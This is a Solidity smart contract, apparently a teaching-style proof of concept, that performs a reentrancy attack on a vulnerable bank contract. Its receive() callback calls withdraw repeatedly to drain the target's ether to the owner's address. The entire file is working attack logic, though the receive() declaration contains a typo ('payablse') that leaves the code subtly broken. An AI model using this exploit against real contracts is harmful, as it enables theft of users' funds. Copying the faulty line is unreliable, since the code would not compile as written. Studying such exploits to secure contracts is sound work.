// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.7.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw(uint _amount) external;
}

contract ReentrancyAttack {
    IVulnerableBank public vulnerableBank;
    address public owner;

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = IVulnerableBank(_vulnerableBankAddress);
        owner = msg.sender;
    }

    // Fallback function to call withdraw again after receiving ether
    receive() external payablse {
        if (address(vulnerableBank).balance >= 1 ether) {
            vulnerableBank.withdraw(1 ether);
        }
    }

    // function to deposit ether and start the attack
    function attack() external payable {
        require(msg.value >= 1 ether, "Minimum attack deposit is 1 ether");
        vulnerableBank.deposit{value: 1 ether}();
        vulnerableBank.withdraw(1 ether);
    }

    // Withdraw Ether from this smart contract to the attacker's address
    function withdraw() public {
        require(msg.sender == owner, "Only the owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }

    // Function to deposit Ether to the VulnerableBank contract
    function depositToBank() external payable {
        vulnerableBank.deposit{value: msg.value}();
    }
}
